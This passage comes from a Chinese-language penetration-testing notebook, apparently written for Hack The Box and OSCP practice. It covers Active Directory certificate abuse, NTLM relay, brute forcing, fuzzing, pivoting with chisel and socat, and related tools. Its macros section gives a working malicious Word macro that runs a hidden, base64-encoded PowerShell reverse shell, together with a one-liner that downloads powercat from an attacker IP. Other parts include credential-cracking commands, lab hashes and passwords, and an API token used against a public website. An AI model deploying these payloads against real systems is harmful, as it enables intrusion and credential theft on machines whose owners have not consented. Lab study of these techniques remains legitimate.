source certipy/bin/activate
pip install certipy-ad
certipy -h

# 退出虚拟环境
deactivate
```

Certipy 将加载 PFX，执行 PKINIT 以获取管理员的 Kerberos TGT，甚至尝试检索 NTLM 哈希。

```bash
# 需要时间同步，否则执行会失败
certipy auth -pfx ca_svc.pfx -password 42qC3AQgi1qGEb8OuYXw -dc-ip '10.10.11.69' -username 'ca_svc' -domain 'fluffy.htb'

# 使用以下选项可能会避免时间同步问题
-ns nameserver        Nameserver for DNS resolution
-dns-tcp              Use TCP instead of UDP for DNS queries
```

查找域用户ca_svc的证书模板漏洞。

```bash
certipy find -u ca_svc -hashes ":ca0f4f9e9eb8a092addf53bb03fc98c8" -dc-ip '10.10.11.69' -vulnerable -enabled

certipy find -u john -p 'P@ssw0rd456!' -dc-ip '10.129.116.183' -vulnerable -enabled
```

p.agila对ca_svc有`GenericWrite` 权限，可直接发动影子凭据攻击获取ca_svc的Kerberos票据和NTLM Hash

```bash
certipy shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -account 'ca_svc' auto
certipy shadow -u 'sam@tombwatcher.htb' -p 'Password123!' -dc-ip '10.129.189.93' -account 'john' auto
```

## Impacket-ntlmrelayx 

```bash
# 中继一个对winrm_svc有写入影子凭据权限的NTLM认证，生成RSA密钥对，修改winrm_svc的影子凭据属性，输出.pfx证书文件。
impacket-ntlmrelayx -t ldap://dc01.fluffy.htb --shadow-credentials --shadow-target 'winrm_svc'
```

## Impacket-getTGT 

```bash
impacket-getTGT -dc-ip 10.10.11.69 -cert-pfx winrm_svc.pfx fluffy.htb/winrm_svc
```



# Windows Privilege Escalation

参考链接：

https://fuzzysecurity.com/tutorials/16.html

https://github.com/saisathvik1/Windows-Privilege-Escalation-Notes

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#wertrigger

## Information Gathering

```
# 输出主机名、系统名称、系统版本、系统类型和安装的修补程序（补丁）信息
systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"
```

## Kernel Exploit

### Wesng

[Wesng](https://github.com/bitsadmin/wesng)强烈建议安装在kali的python虚拟环境中！

```
python3 -m venv wesng
source wesng/bin/activate
pip install wesng
pip install chardet

wes -help
```

wes常见命令如下：

```
# 更新已知漏洞
wes --update

# 根据补丁信息寻找已知的windows内核漏洞
wes systeminfo.txt -e

# 寻找提权漏洞
wes systeminfo.txt -e -i "Elevation of Privilege"
```

### i686-w64-mingw32-gcc

kali自带工具，实现linux平台编译32位的windows恶意程序，并用来内核提权和dll劫持。

```bash
i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32

-lws2_32 ：链接Windows的Winsock2库（如果代码涉及网络功能，如远程利用）。
```



# PrivateBin

PrivateBin是一个极简，开源，对粘贴内容毫不知情的在线粘贴板，数据*在浏览器内*进行AES-256加密。

```
https://paste.offsec.com/
```



# .git

## Git Cheat Sheet

https://education.github.com/git-cheat-sheet-education.pdf

## git-dumper

[git-dumper](https://github.com/arthaud/git-dumper)用于从网站转储 git 存储库的工具。建议使用python虚拟环境安装该工具，若python环境版本太高，建议使用docker。

git-dumper适用于如下情况：

访问`/dev/.git` 会返回一个302，重定向到 `/404` ，就像网站上不存在的任何其他内容一样，但 `/dev/.git/config` 会返回一些内容。

```
# 创建名为git的目录，将目标网站上的.git转储进目录git。
mkdir git
git-dumper http://vessel.htb/dev git 
or
cd git/
git_dumper http://siteisup.htb/dev/.git/ .

# 成功转储git目录后，使用以下命令获取最新的commit，用以恢复当前工作树。
git checkout .

# 如果使用git checkout .出现崩溃，使用如下命令查看问题。
git status

# 检查存储库中存在的几个提交commit哈希值
git log
git log --oneline

# 比较Git仓库中两个提交（commit）哈希值之间的差异，Git会显示这两个commit之间的文件改动（新增、删除、修改的内容）。
git diff f1369cf edb18f3
```

## gitleaks

[gitleaks](https://github.com/gitleaks/gitleaks)用于检测 git 存储库、文件中的密码、API 密钥和令牌等秘密。

配置gitleaks的参考链接如下：

https://medium.com/@cuncis/protecting-your-git-repositories-a-comprehensive-guide-to-using-gitleaks-for-securing-sensitive-323fd5fc9638



# Feroxbuster

Feroxbuster是一种旨在执行强制浏览的工具， 可在[Feroxbuster 配置文件](https://youtu.be/d4tYWJzZ8QE?t=341)设置默认字典，kali自带该工具。

```
# 以下字典比较适用于爆破.git目录中默认文件
feroxbuster -u http://10.10.11.178/ -w /opt/SecLists/Discovery/Web-Content/common.txt
feroxbuster -u http://10.10.11.178/ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt

# 包含文件后缀php
feroxbuster -u http://siteisup.htb -x php

# 扫描不会深入到第三级或更深层级
feroxbuster -u "http://bitforge.lab/" -w /usr/share/seclists/Discovery/Web-Content/common.txt --depth 2 --filter-status 404

# 带cookie头部扫描，开启ssl验证，输出详细信息，自动重定向
feroxbuster -u https://sorcery.htb/ -C "Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjM1ODNhNzIzLWNiNTYtNDFlYS1hMDRiLTQ5YWIzZmFmNDNlYyIsInVzZXJuYW1lIjoibGVsZSIsInByaXZpbGVnZUxldmVsIjowLCJ3aXRoUGFzc2tleSI6ZmFsc2UsIm9ubHlGb3JQYXRocyI6bnVsbCwiZXhwIjoxNzUwMzE0Nzg0fQ.e1JAqlu06ouApRDktGdqi1b0ZxMMCjyhILAAwTYv93U" --insecure -v -r

# 头部认证
feroxbuster -u https://sorcery.htb/ -H Accept:application/json "Authorization: Gaurav"
```



# Modify Header Value

## 火狐插件

修改header头部值的插件链接：https://addons.mozilla.org/en-US/firefox/addon/modify-header-value/

## Burpsuite

添加头部字段值的步骤如下：

```
进入 "Proxy" → "Options" → "Match and Replace" → "Add" 并在 "Replace" 输入字段中添加 "Special-Dev： only4dev"
```



# Macros

## Microsoft Office

### word

启用宏的文件后缀：.doc、.docm

#### openshell

在Microsoft Office Word中创建名为OpenShell的宏，具体步骤可参考[链接](https://freedium.cfd/https://infosecwriteups.com/oscp-tactics-how-to-create-a-malicious-word-macro-for-remote-code-execution-276ee7c638a5)。

```vb
Sub AutoOpen()
	OpenShell
End Sub

Sub Document_Open()
	OpenShell
End Sub

Sub OpenShell()
	CreateObject("Wscript.Shell").Run "powershell"
End Sub
```

#### reverseshell

##### powershell evil payload

```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.1952/powercat.ps1');powercat -c 192.168.45.195 -p 7777 -e powershell
```

##### base64 encoding

online

注意：UTF-16LE 是 PowerShell 支持的 base64 编码的默认字符集。如果我们选择任何其他字符集，我们的 payload 可能不起作用。

```
https://www.base64encode.org/
```

powershell commands

`-e` 参数要求的格式：UTF-16LE 编码的 Base64 字符串

```powershell
# UTF-16LE 编码
$command = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.1952/powercat.ps1');powercat -c 192.168.45.195 -p 7777 -e powershell"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
Write-Output $encodedCommand

# 解码查看内容，不执行
$encodedCommand = "bgBvAHQAZQBwAGEAZAA="
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encodedCommand))
```

##### python script

```python
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..." 
 
n = 50 
 
for i in range(0, len(str), n): 
    print("Str = Str + " + '"' + str[i:i+n] + '"') 
```

##### macro payload

```vb
Sub AutoOpen() 
    ReverseShell 
End Sub 
 
Sub Document_Open() 
    ReverseShell
End Sub 
 
Sub ReverseShell() 
    Dim Str As String 
     
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU" 
        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd" 
        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB" 
    ... 
        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA" 
        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA" 
        Str = Str + "A== " 
 
    CreateObject("Wscript.Shell").Run Str 
End Sub
```

### Evil-Macro

[Evil-Macro](https://github.com/rodolfomarianocy/Evil-Macro)是一个python脚本，可生成恶意宏代码，用于powershell环境的reverse shell。

```bash
python evil_macro.py -l 192.168.33.168 -p 443 -o macro.txt
```

### Kronos

[Kronos](https://github.com/ELMERIKH/Kronos)是一个python脚本工具，可生成带有恶意宏代码的DOCM或PPTM。

```bash
# 实现reverseshell
python3 kronos.py -Url 'http://192.168.11.110:8080/keres.ps1' --word_file 'evil.docx' -PE 'powershell.exe ./yes.ps1'
```

### EvilClippy

[EvilClippy](https://github.com/outflanknl/EvilClippy?tab=readme-ov-file)用于创建恶意 MS Office 文档的跨平台工具。

新手阅读指南：https://www.outflank.nl/blog/2019/05/05/evil-clippy-ms-office-maldoc-assistant/

## LibreOffice

### word

启用宏的文件后缀：.odt

LibreOffice在linux平台构建带有恶意宏的odt文件，也适用于windows系统，可参考[链接](https://github.com/AaronCaiii/OSCP-Prepare-Proving-grounds-Practice/blob/main/PG/35.%20Craft.md)。

### metasploit

无需安装LibreOffice，可利用metasploit生成恶意 odt 文件，使用的exploi模块如下，可参考[链接](https://medium.com/@mahdi_78420/craft-walkthrough-practice-72da171c6bec)。

```
multi/misc/openoffice_document_macro
```

### morgans

[morgans](https://github.com/MrSud0/Morgans)生成一组恶意或良性odt文件的工具。恶意文件有一个嵌入式宏，可根据需要更改该宏，以便在用户打开文件时执行任何命令。



# Xampp

## /etc/passwd

如果在使用xampp套件所搭建的web服务中发现LFI漏洞，那么除了可以临幸D:\xampp\passwords.txt文件，还可以测试D:\xampp\security\目录，当然前提是存在这个目录（因为security不是默认存在的），\security目录下一般存在webdav、FileZilia（ftp）认证凭据，认证文件形式一般为**.htpasswd**（webdav.htpasswd）、**.htdigest**、**.passwd**（proftpd.passwd）、**.group**（proftpd.group），当然这些认证文件也会存在于其他目录中（比如常见的D:/xampp/apache），因为AuthFile路径是可以自定义的。 

### 配置webdav服务

**第一步**，在D:\xampp\apache\conf\httpd.conf中加载如下模块（也就是去掉#）

```
LoadModule auth_digest_module modules/mod_auth_digest.so
LoadModule dav_module modules/mod_dav.so
LoadModule dav_fs_module modules/mod_dav_fs.so
LoadModule dav_lock_module modules/mod_dav_lock.so
```

**第二步**，在httpd.conf或D:\xampp\apache\conf\extra\httpd-dav.conf中配置如下内容。需要注意的是`Require all granted`一定要被注释掉，否则目录保护无法开启，与`require valid-user`冲突；一定要设置`Options Indexes FollowSymLinks`，默认配置是没有的，不配置的话，相当于没有服务目录，访问/webdav会一直返回403；`LimitExcept OPTIONS`表明只允许未经验证的用户发起options请求；`${SRVROOT}`一般指的是D:/xampp/apache。

```
Alias /webdav "D:/xampp/webdav/files"

<Directory "D:/xampp/webdav/files">
#Require all granted
    Dav On
    Options Indexes FollowSymLinks

    AuthType Digest
    AuthName "DAV-upload"
    # You can use the htdigest program to create the password database:
    #   htdigest -c "${SRVROOT}/user.passwd" DAV-upload admin
    AuthUserFile "${SRVROOT}/user.passwd"
    AuthDigestProvider file

    # Allow universal read-access, but writes are restricted
    # to the admin user.
    <LimitExcept OPTIONS>
        require valid-user
    </LimitExcept>
</Directory>
```

**第三步**，运行以下命令，设置访问webdav目录的凭据。需注意的是 "DAV-upload" 必须要与 AuthName 的值相同。

```
D:\xampp\apache\bin\htdigest -c "${SRVROOT}/user.passwd" DAV-upload admin
```

user.passwd文件内容如下。

```
admin:DAV-upload:2a41237caa097f017293a91f1876d0e0
```

## 往事回忆：看到目录就想PUT一下

webdav目录默认存在PUT上传功能。通过设置认证，保护webdav目录不被恶意put和delete。

未经认证即可完成put上传。

```
curl -X PUT "D:\xampp\webdav\webdav.txt" http://127.0.0.1/webdav/webdav.txt
```

通过basic认证完成put上传。

```
curl -u "admin:ms17" -T "D:\xampp\webdav\webdav.txt" http://127.0.0.1/webdav/webdav.txt
```

通过digest认证完成put上传。

```
curl -u "admin:ms17" --digest -T "D:\xampp\webdav\webdav.txt" http://127.0.0.1/webdav/webdav.txt
```



# Cadaver 

用来连接WebDav服务，通常需要凭据！

```
# 注意有时候根目录就可以是一个WebDav服务目录
cadaver http://192.168.219.122
```



# OpenVpn

## 往事回忆：`openvpn ./SG_XieYile.ovpn`这还能运行失败

Debian 10 Buster默认仓库中的 OpenVPN 版本是 **2.4.7**，而有些配置文件 `.ovpn` 使用了新版 OpenVPN（2.5+）才支持的选项，例如 `data-ciphers-fallback`等。可以使用下面换源的方法，下载最新版openvpn客户端。当然最好建议是使用Debian11、Debian12。

```bash
1、# 添加 backports 源
echo "deb http://deb.debian.org/debian buster-backports main" | sudo tee /etc/apt/sources.list.d/buster-backports.list
sudo apt update

  # 安装新版 OpenVPN
sudo apt -t buster-backports install openvpn


2、# 添加 OpenVPN 官方仓库（适用于 Debian/Ubuntu）
wget -O - https://swupdate.openvpn.net/repos/repo-public.gpg | sudo apt-key add -
echo "deb http://build.openvpn.net/debian/openvpn/stable $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/openvpn.list
sudo apt update
sudo apt install openvpn
```



# WpScan

```
api-token：Y90rKViS8S8crLCLOVzejf4yrVXabiNe1S8uPGgXsMg

# 枚举用户、插件、主题
wpscan --url https://www.lierfang.com/ --api-token Y90rKViS8S8crLCLOVzejf4yrVXabiNe1S8uPGgXsMg --enumerate u,p,t

# 不更新扫描器数据库
wpscan --url https://www.lierfang.com/ --no-update

# 自动枚举用户，使用字典爆破
wpscan --url https://www.lierfang.com/ -P /usr/share/wordlists/rockyou.txt
```



# Nmap

## 往事回忆：nmap扫端口太慢

nmap应用识别是块好手，但是扫端口太慢，但有时候打靶场或者考试用习惯了又不太舍得丢，所以建议挂后台和分段扫描，尤其是目标网络不好或者你是ssh远程到攻击机开展nmap扫描的时候，就是你还没扫完，ssh就已经先断开了，贼难受！当然也可以使用像rustscan、masscan等快速扫描器。

```
1、分段扫描（直接用谷安苑老师的）
for a in $(seq 1 500 65535); do let b=$((a+499)); sleep 2; echo ---$a-$b---; sudo nmap -p $a-$b 10.129.189.93 | grep open; done

2、挂后台扫描
sudo nmap -p- -Pn 10.10.11.68 -T4 -oN ports.txt$
sudo nmap -Pn -n 10.10.11.68 -sC -sV -p- --open > ports.txt$

3、使用漏洞脚本
sudo nmap -Pn -p80,8080 -sCV --script vuln 10.10.11.68 -T4 

4、nmap参数解释
sudo   表示默认使用更快的半开 SYN 扫描
-n 	   表示忽略 DNS 和 IP 地址
--open 表示只对发现的开放端口应用脚本和版本扫描
```

如果端口636（安全 LDAP）和 2369 被标记为"tcpwrapped"，含义模糊，则一一使用 netcat 抓取横幅（banner）或重新运行 Nmap仅针对那些被标记为"tcpwrapped"的端口，并带上 -T0 进行超慢扫描，或许能获得更清晰的应用信息。

```
nc -nv 10.10.11.68 636 -w 3

nc -nv 10.10.11.68 2369 -w 3

sudo nmap -p636,2369 -sCV -Pn 10.10.11.68 -T0
```

## Udp端口扫描

```
sudo nmap -Pn -n 10.10.11.68 -sU --top-ports=100 --reason

--reason : 显示端口状态判断的原因
--top-ports=100 : 扫描最常见的前100个UDP端口（按使用频率排序）
```

## Kerberos Authentication Brute 

```
# 通过Kerberos协议枚举用户名
nmap -Pn -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm="vault.offsec",userdb='/home/kali/Desktop/wordlists/seclists/Usernames/Names/names.txt' 192.168.45.172
```

## GetOpenPorts

```
cat ports.txt | cut -f1 -d '/' | tr '\n' ','
```

## Top 1,000 TCP and UDP

https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/

```
# 筛选top 100的udp端口
grep udp /usr/share/nmap/nmap-services | sort -r -k3 | head -n 100
```



# Chisel

## 往事回忆：配置正向socks5代理总是忘记--socks5

以前正向和反向socks5代理总是傻傻分不清，后来用久了发现不需要分清能用就行。正向代理的命令如下。

```bash
VPS:
chisel server -p 8080 --socks5

kali:
chisel client 91.149.238.154:8080 192.168.80.129:1090:socks
```

## 端口转发

注意两端使用的版本最好一致，否则容易出bug。

```
# kali
chisel server --port 445 --reverse  

# victim
upload chisel.exe
.\chisel.exe client 192.168.45.204:445 R:1433:127.0.0.1:1433
```

## 配置反向socks5

考试怕遇到防火墙，无脑用反向socks5代理就行！

```
# victim
chisel client 192.168.49.126:8000 R:1080:socks

# kali
chisel server -p 8000 --reverse
```



# Docker

## kali安装docker

```
kali@kali:~$ sudo apt update
kali@kali:~$
kali@kali:~$ sudo apt install -y docker.io
kali@kali:~$ sudo apt install docker-compose
kali@kali:~$ sudo systemctl enable docker --now
kali@kali:~$
kali@kali:~$ docker
kali@kali:~$ sudo usermod -aG docker $USER
kali@kali:~$ reboot
```

## 往事回忆：震惊！我家镜像自己会翻墙

配置代理下载docker镜像

```bash
sudo mkdir -p /etc/systemd/system/docker.service.d 
sudo touch /etc/systemd/system/docker.service.d/proxy.conf
```

注意代理本地开启允许局域网访问

```
###proxy.conf
[Service]
Environment="HTTP_PROXY=http://192.168.80.1:1080/"
Environment="HTTPS_PROXY=http://192.168.80.1:1080/"
```

```bash
sudo systemctl daemon-reload
sudo systemctl restart docker
```

## Build镜像 VS Pull镜像

| **操作**           | **作用**                                       | **数据来源**                              | **典型场景**                                             |
| :----------------- | :--------------------------------------------- | :---------------------------------------- | :------------------------------------------------------- |
| **`docker pull`**  | 从远程仓库（如 Docker Hub）下载 **现成的镜像** | 远程镜像仓库（如 `registry-1.docker.io`） | 快速获取官方或他人构建好的镜像（如 `nginx`, `alpine`）。 |
| **`docker build`** | 根据 `Dockerfile` **自定义构建新镜像**         | 本地文件（`Dockerfile` + 上下文文件）     | 需要定制化环境（如代码、配置、依赖注入）。               |



# Dydra

## 往事回忆：命令？这辈子都记不住

注意hydra分为[thc-hydra](https://github.com/vanhauser-thc/thc-hydra)和[ory-hydra](https://github.com/ory/hydra)，平常用的是thc-hydra，是没有header选项的，遇到需要填充Cookie的时候，往往傻眼了。

## POST表单爆破

```
hydra -vV -e ns -f -l '1@qq.com' -P /usr/share/wordlists/rockyou.txt 10.10.11.67 -t 6 http-post-form "/login:_token=ytfLB0KL9egXCleZSND2DKcW3qSX8q0sp8mACkvb&email=^USER^&password=^PASS^&remember=False:Invalid credentials"
```

## GET表单爆破

```
hydra -L users.txt -P passwords.txt example.com http-get-form "/login.php:username=^USER^&password=^PASS^:Invalid login"
```

## Basic认证爆破

```
hydra -l bob -P /usr/share/wordlists/rockyou.txt -f 10.10.7.35 http-get /protected/
```

## FTP弱口令爆破

考试遇到ftp服务直接开炮！

```
# 使用 "用户名:密码" 组合文件（而不是单独的 -L 用户名单和 -P 密码字典）爆破。
hydra -v -t 6 -C /usr/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.56.110
```



# Wfuzz

wfuzz和fuff工具一样，可用于web模糊匹配。平时除了用来子域名爆破和寻找Get参数，还可以做表单爆破。但是这个工具如果使用大字典很吃内存，虚拟机建议使用8G，否则系统很卡，而且程序会自动闪退。

## POST表单爆破

```
wfuzz -c --hh=466 -w /usr/share/wordlists/rockyou.txt -d "_token=vs4deAMi2VdTvy30gY7KjqtjTGsFk5evyirkhKKH&email=1%40q.com&password=FUZZ&remember=False" -H "Cookie: XSRF-TOKEN=eyJpdiI6IlVRVmM1Nk80M0RudDNnVTB1Q0RFeXc9PSIsInZhbHVlIjoiVVNsMnFSZ1hGdkY2TzQxNC83UHp6QmlxdGJ6bWNuWlBNSXIyaVUvTm5sMFV5OHFjMU1vRW0vSmZQalBPNXVRU1lpT3pVbVVxWHFvMzVVcVQ3RjRQNkEzaGhFN0Z6T1JhclA1QUtlS001ZUdjWndEaCsvdy93cTRReEE2cFpteFMiLCJtYWMiOiI5ZTY5YjgxMmM3Y2Y2MjI0NmUwMzU1OWYxYjVlOTExNjAzNGZkMWM4ZDI5NGE2NGMxMjY2MDU1M2Q4OTIwMWU3IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6InZFYzNlajBLOStpVmVVS1VUTXpneVE9PSIsInZhbHVlIjoiTzVEWG9Ydm9yVmhiSGR5U0FtZG0reUdBNnNuekMyUk1xMXJ0ZVhRcUF3NlZVRkdlTnJuVWxTNngrNGVtUzQwaVE3Zlc3ZDBWb3FRVHNzWmRnMVhma0JZL1lxVTBzMHFxb0lFWFoyUFpoSkVFZmlDZVVVYW5iT3dRYnEzTkliNFgiLCJtYWMiOiJlNTlmNDZhMTQ5NjMyMWE0YmE0ZTQzY2E3YTExYTE0Y2UyOTNjMzM1ZGI2NDU4N2JmMmQwMDYwY2QyZGU2MTZlIiwidGFnIjoiIn0%3D" "http://environment.htb/login"
```

## 子域名爆破

```
wfuzz -c -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -u planning.htb -H "Host:FUZZ.planning.htb" --hc=301
```

## GET参数名爆破

```
wfuzz -c -z file,wordlist.txt --hh=306 http://example.com/index.php?file=../../../../../../../etc/passwd
```



# FFUF

[FFUF](https://freedium.cfd/https://medium.com/@stealthsecurity/fuzzing-web-applications-using-ffuf-c4ad74190b72)是一个比wfuzz高级一点的工具，它俩功能都差不多，ffuf性能要比wfuzz好不少。**使用-p选项限制并发请求的数量**。

## POST表单爆破--单参数

```
ffuf -w /usr/share/SecLists/Usernames/top-usernames-shortlist.txt -X POST -d "username=FUZZ&&password=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://mydomain.com/login -mr "username already exists"

示例如下：
ffuf -w /usr/share/wordlists/rockyou.txt -X POST -d "_token=T4xdpFfL2xEFSGfMRzI4sez6ioycRiLFLcTcWFQ6&email=1%40qq.com&password=FUZZ&remember=False" -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: XSRF-TOKEN=eyJpdiI6IkdtVWJ6OVFQckxXemdHaTUyRWFDTnc9PSIsInZhbHVlIjoid1NLV2szRG1wbW01a1B0bDVabkNaY050M01YUGxYa3oxUmR4TXJrMUxQSk5TbWlrOUg4YlQ5YUdrUjZjMlJDUkowN2J4V1VxSVNYK1kwYmdSUkNrcDFWbmpWNU9wTkZ3QTQ4eXhHN0ZOUitidVJQN0ZQZG5PWU45aFFaZ1JDMTAiLCJtYWMiOiJhNTkyNjMzYjIyZjkwODNjZTA0Mjg2NDVkM2Y2MDVhYjIwM2JjZDkzMTkxZTNkMmUxNGNiYjVmOTU4ZTZmMTU1IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IkEvVkFwd3U1c3hNelVTVlVQOE5neHc9PSIsInZhbHVlIjoiOHc2cmltWkxxbkpuaE53UEY5T21qd1ZQQWZYWEhzTmxPRVVjRU1SU2hCbDRXWE45a2VLc1BIcytKWjRwMmpHa3hoSGt5eGZJcThiYTRKV2IzTXZYbkJPT2JObm9qQnRzSHUwV0FqQnVVaXd0WmdKL0VoM1dmRUZKRWs3d2tNNmkiLCJtYWMiOiJjMTI0MjJjYzMxZjRiZjYyZTQ4NGFhMzBmYzNkMWIyNjYyOTA4ZjRkYjFhYzZjNDJjODI3OWUxMDM5MmVmMGUyIiwidGFnIjoiIn0%3D" -u http://environment.htb/login -x socks5://192.168.80.129:1090 -fr "Invalid credentials" -c -t 10
```

## POST表单爆破--双参数

```
ffuf -w usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://localhost:3000/login -fc 200
```

## 子域名爆破

```
ffuf -u http://planning.htb/ -w /usr/share/fuzzDicts/subdomainDicts/main.txt -H "Host:FUZZ.planning.htb"  -fs 178

示例如下：
ffuf -u http://tombwatcher.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host:FUZZ.tombwatcher.htb" -x socks5://192.168.80.138:1090 -fs 703
```

## 匹配后缀枚举隐藏文件

```
ffuf -u http://localhost:3000/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt -e .php,.html,.txt
```



# Python2

## 往事回忆：Kali安装pip2

```
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py 
python2 get-pip.py
pip2 -V
```



# GPG

[GNU Privacy Guard](https://gist.github.com/jhjguxin/6037564)，使用对称和非对称混合加密的开源工具，用于加密、签名和密钥管理（PGP 的开源实现）。注意，使用`gpg --gen-key`生成密钥对，若系统熵低于1000，会超时导致生成失败，使用`cat /proc/sys/kernel/random/entropy_avail`可查看熵值。

```
# 加密：
导入目标的公钥后，使用其公钥生成 filename.gpg 加密文件，之后就可以把此文件发送给目标方。
gpg -e -r username filename (-r 表示指定用户)

# 解密：
加密文件的接受方使用自已的私钥解密文件，最终得到filename。
gpg -d filename.gpg
```

## 往事回忆：不理解GPG解密命令在渗透中的利用姿势

GPG配置文件介绍：

```
GPG 配置文件目录:~/.gnupg
~/.gnupg/gpg.conf – 配置文件
~/.gnupg/trustdb.gpg – 信任库
~/.gnupg/pubring.gpg – 公钥库
~/.gnupg/secring.gpg – 私钥库
```

特殊情况：www-data想解密用户hish加密的文件（keyvault.gpg），但是又没有权限更改hish的目录，便可参考以下步骤。

```
# 1. 拷贝 hish 用户的密钥目录
cp -r /home/hish/.gnupg /tmp/mygnupg

# 2. 设置权限
chmod -R 700 /tmp/mygnupg

# 3. 确认是否存在私钥（想要解密用公钥加密的文件，必须使用私钥，私钥一般存储在私钥库中）
gpg --homedir /tmp/mygnupg --list-secret-keys

# 4. 解密 keyvault.gpg（message.txt就是目标文件，文件名是自定义的，文件里面一般存储着登录凭据）
gpg --homedir /tmp/mygnupg --output /tmp/message.txt --decrypt /home/hish/backup/keyvault.gpg
```

## 往事回忆：GPG公钥缺失导致apt运行失败

以下apt更新失败是因为缺少GPG公钥，导致无法获取包，如果此时使用apt下载包还会显示404。

```bash
┌──(kali㉿kali)-[~/HackTheBox/Puppy]
└─$ sudo apt update
Get:1 http://mirrors.ustc.edu.cn/kali kali-rolling InRelease [41.5 kB]
Err:1 http://mirrors.ustc.edu.cn/kali kali-rolling InRelease
The following signatures couldn't be verified because the public key is not available: NO_PUBKEY ED65462EC8D5E4C5
1441 packages can be upgraded. Run 'apt list --upgradable' to see them.
Warning: An error occurred during the signature verification. The repository is not updated and the previous index files will be used. GPG error: http://mirrors.ustc.edu.cn/kali kali-rolling InRelease: The following signatures couldn't be verified because the public key is not available: NO_PUBKEY ED65462EC8D5E4C5
Warning: Failed to fetch http://http.kali.org/kali/dists/kali-rolling/InRelease The following signatures couldn't be verified because the public key is not available: NO_PUBKEY ED65462EC8D5E4C5
Warning: Some index files failed to download. They have been ignored, or old ones used instead.
```

添加GPG公钥命令如下：

```bash
# apt-key导入
wget -q -O - https://archive.kali.org/archive-key.asc | sudo apt-key add -

# gpg导入
wget -q -O - https://archive.kali.org/archive-key.asc | sudo gpg --dearmor -o /etc/apt/trusted.gpg.d/kali-archive-keyring.gpg
```



# BloodHound-CE

安装文档链接：https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart#install-bloodhound-ce

## 往事回忆：md，初始化密码失败！

注意bloodhound-ce 最低配置是4G 4核，如果不满足配置，bloodhound-ce有时会闪退，并且第一次登录时的修改密码操作也不成功。

## 往事回忆：误报！

2025年5月21日打HTB靶场Puppy时，使用BloodHound社区版发现puppy.htb域中的Developers组中存在levi用户，而使用netexe的smb枚举和windapsearch的ldap枚举发现Developers组根本不存在levi用户！目前不清楚kali自带的BloodHound会不会有误报。



# Socat

## UDP代理

使用socat进行udp代理，可用于域时间同步、snmp扫描、nfs枚举

```
# kali
socat UDP4-LISTEN:123,reuseaddr,fork UDP4-SENDTO:207.90.237.59:123&

# VPS
socat UDP4-LISTEN:123,reuseaddr,fork UDP4-SENDTO:10.10.11.41:123&
```

## 端口转发

实现访问192.168.80.129:8080相当于访问127.0.0.1:8080的功能

```
# 输出详细信息
socat -v TCP-LISTEN:8080,bind=192.168.80.129,fork TCP:127.0.0.1:8080

# 后台运行，不占用终端
socat TCP-LISTEN:8080,bind=192.168.80.129,fork TCP:127.0.0.1:8080 &

# 使用nohup，防止终端关闭后进程被杀死
nohup socat TCP-LISTEN:8080,bind=192.168.80.138,fork TCP:127.0.0.1:8080 &

# 调出后台进程，使用ctrl+c 关闭该进程
┌──(kali㉿kali)-[~/HackTheBox/Fluffy]
└─$ jobs
[1]  + running    socat TCP-LISTEN:8080,bind=192.168.80.129,fork TCP:127.0.0.1:8080
┌──(kali㉿kali)-[~/HackTheBox/Fluffy]
└─$ fg %1
[1]  + running    socat TCP-LISTEN:8080,bind=192.168.80.129,fork TCP:127.0.0.1:8080
^C 
```



# chocolaty

[chocolaty](https://chocolatey.org/) 是一个Windows 包管理器 ，可以快速装 Visual C++ 开发工具，也适用于 Windows 的 OpenSSL 工具。安装chocolaty必须使用管理员打开powershell，安装成功后choco -v 会返回版本。

```
# 第一步：设置执行策略
Set-ExecutionPolicy Bypass -Scope Process -Force

# 第二步：设置安全协议
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072

# 第三步：下载并安装
iex ((New-Object System.Net.WebClient).DownloadString("https://chocolatey.org/install.ps1"))
```

安装 Visual C++ 开发工具命令如下，成功安装**Visual Studio**后，在开始菜单搜索 **"x64 Native Tools Command Prompt for VS 2017"**，点击后会通过 **VS开发者命令行**自动设置所有环境变量，否则使用cl命令编译会出错，比如找不到头文件啥的。

```
choco install visualcpp-build-tools
```



# mod0keecrack

